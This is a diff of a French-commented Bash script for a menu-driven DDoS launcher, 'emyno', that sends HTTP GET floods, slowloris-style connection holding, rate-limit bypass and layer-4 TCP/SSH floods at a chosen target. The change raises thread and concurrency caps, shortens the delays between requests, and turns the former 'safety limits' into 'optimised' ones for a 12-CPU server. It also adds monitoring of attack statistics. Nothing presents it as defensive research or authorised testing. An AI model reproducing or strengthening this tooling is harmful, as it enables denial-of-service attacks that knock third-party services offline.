@@ -2,9 +2,15 @@
 
 set -uo pipefail
 
-# Limites système pour protéger le serveur
-ulimit -u 4096
-ulimit -n 8192
+# Limites système optimisées pour 12 CPU / 32 GB RAM
+ulimit -u 8192
+ulimit -n 16384
+
+# Spécifications serveur
+CPU_CORES=12
+RAM_GB=32
+MAX_THREADS_L7=5000
+MAX_THREADS_L4=3000
 
 # Couleurs
 RED='\033[0;31m'
@@ -88,9 +94,20 @@ show_menu() {
     echo -e "${WHITE}╠══════════════════════════════════════════════════════════════════════╣${NC}"
     echo -e "${WHITE}║${NC} ${CYAN}UTILITIES:${NC}                                                          ${WHITE}║${NC}"
     echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
+    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
+    echo -e "${WHITE}╠══════════════════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${WHITE}║${NC} ${CYAN}UTILITIES & TOOLS:${NC}                                                  ${WHITE}║${NC}"
+    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
     echo -e "${WHITE}║${NC}  ${YELLOW}[99]${NC} View Active Attacks                                            ${WHITE}║${NC}"
     echo -e "${WHITE}║${NC}  ${YELLOW}[98]${NC} Stop All Attacks                                              ${WHITE}║${NC}"
     echo -e "${WHITE}║${NC}  ${YELLOW}[97]${NC} Test Connection                                               ${WHITE}║${NC}"
+    echo -e "${WHITE}║${NC}  ${YELLOW}[96]${NC} System Monitoring (CPU, RAM, Network)                         ${WHITE}║${NC}"
+    echo -e "${WHITE}║${NC}  ${YELLOW}[95]${NC} Bandwidth Test (Speed Test)                                  ${WHITE}║${NC}"
+    echo -e "${WHITE}║${NC}  ${YELLOW}[94]${NC} Network Statistics (ifconfig, netstat)                        ${WHITE}║${NC}"
+    echo -e "${WHITE}║${NC}  ${YELLOW}[93]${NC} Latency Test (Ping multiple hosts)                           ${WHITE}║${NC}"
+    echo -e "${WHITE}║${NC}  ${YELLOW}[92]${NC} View Attack Statistics (dstat logs)                          ${WHITE}║${NC}"
+    echo -e "${WHITE}║${NC}  ${YELLOW}[91]${NC} Process Monitor (Top processes)                              ${WHITE}║${NC}"
+    echo -e "${WHITE}║${NC}  ${YELLOW}[90]${NC} Network Interface Info                                        ${WHITE}║${NC}"
     echo -e "${WHITE}║${NC}  ${YELLOW}[0]${NC}  Exit                                                           ${WHITE}║${NC}"
     echo -e "${WHITE}╚══════════════════════════════════════════════════════════════════════╝${NC}"
     echo ""
@@ -111,13 +128,23 @@ get_attack_params() {
     read -p "$(echo -e ${YELLOW}Duration in seconds [default: 60]:${NC} ) " DURATION
     DURATION=${DURATION:-60}
     
-    read -p "$(echo -e ${YELLOW}Threads/Connections [default: 500, max recommended: 2000]:${NC} ) " THREADS
-    THREADS=${THREADS:-500}
+    # Déterminer les limites selon le type d'attaque
+    if [[ "$method" =~ ^(tcp|tcp-bot|tcp-pshack|tcprand|sshkill|sshkill-bot)$ ]]; then
+        MAX_THREADS=$MAX_THREADS_L4
+        DEFAULT_THREADS=2000
+        echo -e "${CYAN}Server specs: ${CPU_CORES} CPU cores, ${RAM_GB} GB RAM${NC}"
+        read -p "$(echo -e ${YELLOW}Threads/Connections [default: $DEFAULT_THREADS, max: $MAX_THREADS]:${NC} ) " THREADS
+        THREADS=${THREADS:-$DEFAULT_THREADS}
+    else
+        MAX_THREADS=$MAX_THREADS_L7
+        DEFAULT_THREADS=3000
+        echo -e "${CYAN}Server specs: ${CPU_CORES} CPU cores, ${RAM_GB} GB RAM${NC}"
+        read -p "$(echo -e ${YELLOW}Threads/Connections [default: $DEFAULT_THREADS, max: $MAX_THREADS]:${NC} ) " THREADS
+        THREADS=${THREADS:-$DEFAULT_THREADS}
+    fi
     
-    # Limiter le nombre de threads pour éviter la surcharge
-    MAX_THREADS=2000
     if [ "$THREADS" -gt "$MAX_THREADS" ]; then
-        echo -e "${YELLOW}⚠ Limiting threads to $MAX_THREADS to prevent server overload${NC}"
+        echo -e "${YELLOW}⚠ Limiting threads to $MAX_THREADS (server limit)${NC}"
         THREADS=$MAX_THREADS
     fi
     
@@ -189,12 +216,12 @@ TIMEOUT=$((DURATION + 10))
 PROTOCOL="https"
 [ "$PORT" = "80" ] && PROTOCOL="http"
 
-# Limites de sécurité
-MAX_CONCURRENT=100
-MAX_CPU=85
-MAX_MEM=85
-BATCH_SIZE=20
-BATCH_DELAY=0.1
+# Limites optimisées pour 12 CPU / 32 GB RAM
+MAX_CONCURRENT=400
+MAX_CPU=92
+MAX_MEM=92
+BATCH_SIZE=50
+BATCH_DELAY=0.02
 
 echo "[$METHOD] Starting attack on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS threads"
 echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%, Max concurrent: $MAX_CONCURRENT"
@@ -327,7 +354,7 @@ attack_raw() {
             "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
         
         request_count=$((request_count + 1))
-        sleep 0.02
+        sleep 0.005
     done
 }
 
@@ -363,12 +390,12 @@ METHOD="METHOD_NAME"
 PROTOCOL="http"
 [ "$PORT" = "443" ] && PROTOCOL="https"
 
-# Limites de sécurité
-MAX_CONCURRENT=200
-MAX_CPU=85
-MAX_MEM=85
-BATCH_SIZE=30
-BATCH_DELAY=0.08
+# Limites optimisées pour haute performance
+MAX_CONCURRENT=450
+MAX_CPU=92
+MAX_MEM=92
+BATCH_SIZE=55
+BATCH_DELAY=0.015
 
 echo "[$METHOD] Starting RAW GET flood on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS threads"
 echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%, Max concurrent: $MAX_CONCURRENT"
@@ -403,7 +430,7 @@ attack_get() {
             "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
         
         request_count=$((request_count + 1))
-        sleep 0.03
+        sleep 0.01
     done
 }
 
@@ -439,12 +466,12 @@ METHOD="METHOD_NAME"
 PROTOCOL="https"
 [ "$PORT" = "80" ] && PROTOCOL="http"
 
-# Limites pour slowloris-like
-MAX_CONCURRENT=80
-MAX_CPU=80
-MAX_MEM=80
-BATCH_SIZE=15
-BATCH_DELAY=0.15
+# Limites optimisées pour slowloris-like
+MAX_CONCURRENT=300
+MAX_CPU=90
+MAX_MEM=90
+BATCH_SIZE=40
+BATCH_DELAY=0.05
 
 echo "[$METHOD] Starting ratelimit bypass attack on $PROTOCOL://$TARGET:$PORT for ${DURATION}s"
 echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%, Max concurrent: $MAX_CONCURRENT"
@@ -528,9 +555,9 @@ PROTOCOL="https"
 THREADS=$((THREADS > 10 ? 10 : THREADS))
 DURATION=$((DURATION > 7200 ? 7200 : DURATION))
 
-# Limites de sécurité
-MAX_CPU=75
-MAX_MEM=75
+# Limites optimisées
+MAX_CPU=85
+MAX_MEM=85
 
 echo "[$METHOD] Holding connections on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS connections"
 echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%"
@@ -590,12 +617,12 @@ METHOD="METHOD_NAME"
 PROTOCOL="https"
 [ "$PORT" = "80" ] && PROTOCOL="http"
 
-# Limites de sécurité
-MAX_CONCURRENT=120
-MAX_CPU=85
-MAX_MEM=85
-BATCH_SIZE=20
-BATCH_DELAY=0.1
+# Limites optimisées pour haute performance
+MAX_CONCURRENT=350
+MAX_CPU=92
+MAX_MEM=92
+BATCH_SIZE=45
+BATCH_DELAY=0.02
 
 echo "[$METHOD] Starting attack on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS threads"
 echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%, Max concurrent: $MAX_CONCURRENT"
@@ -629,7 +656,7 @@ attack_generic() {
             "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
         
         request_count=$((request_count + 1))
-        sleep 0.04
+        sleep 0.01
     done
 }
 
@@ -671,12 +698,12 @@ if [ "$PORT" = "80" ] || [ "$PORT" = "443" ]; then
     exit 1
 fi
 
-# Limites de sécurité pour L4
-MAX_CONCURRENT=300
-MAX_CPU=80
-MAX_MEM=80
-BATCH_SIZE=50
-BATCH_DELAY=0.2
+# Limites optimisées pour L4 (12 CPU / 32 GB RAM)
+MAX_CONCURRENT=600
+MAX_CPU=90
+MAX_MEM=90
+BATCH_SIZE=80
+BATCH_DELAY=0.05
 
 echo "[$METHOD] Starting attack on $TARGET:$PORT for ${DURATION}s with $THREADS threads"
 echo "[$METHOD] Resource limits: CPU<$MAX_CPU%, MEM<$MAX_MEM%, Max concurrent: $MAX_CONCURRENT"
@@ -784,9 +811,20 @@ launch_l4_attack() {
     fi
     
     echo -e "${GREEN}Launching ${method} attack...${NC}"
+    
+    # Démarrer le monitoring dstat
+    start_dstat_monitoring "$method" "$DURATION"
+    
+    # Lancer l'attaque
     bash "$script_path" "$TARGET" "$PORT" "$DURATION" "$THREADS" "$OPTIONS" &
-    echo $! > "/tmp/emyno_${method}.pid"
-    echo -e "${GREEN}Attack started! PID: $(cat /tmp/emyno_${method}.pid)${NC}"
+    local attack_pid=$!
+    echo $attack_pid > "/tmp/emyno_${method}.pid"
+    
+    echo -e "${GREEN}Attack started! PID: $attack_pid${NC}"
+    echo -e "${CYAN}Monitoring active. Stats will be available after attack.${NC}"
+    
+    # Attendre la fin de l'attaque et afficher les stats
+    (wait $attack_pid 2>/dev/null; sleep 2; stop_dstat_monitoring "$method"; show_dstat_stats "$method") &
 }
 
 # Fonction pour voir les attaques actives
@@ -894,6 +932,13 @@ main() {
             99) view_active_attacks ;;
             98) stop_all_attacks ;;
             97) test_connection ;;
+            96) system_monitoring ;;
+            95) bandwidth_test ;;
+            94) network_statistics ;;
+            93) latency_test ;;
+            92) view_attack_stats ;;
+            91) process_monitor ;;
+            90) network_interface_info ;;
             0) 
                 stop_all_attacks
                 echo -e "${GREEN}Goodbye!${NC}"
@@ -905,7 +950,7 @@ main() {
                 ;;
         esac
         
-        if [ $? -eq 0 ] && [ "$choice" -ge 1 ] && [ "$choice" -le 43 ]; then
+        if [ $? -eq 0 ] && [ "$choice" -ge 1 ] && [ "$choice" -le 26 ]; then
             echo ""
             read -p "$(echo -e ${YELLOW}Press Enter to continue...${NC})"
         fi
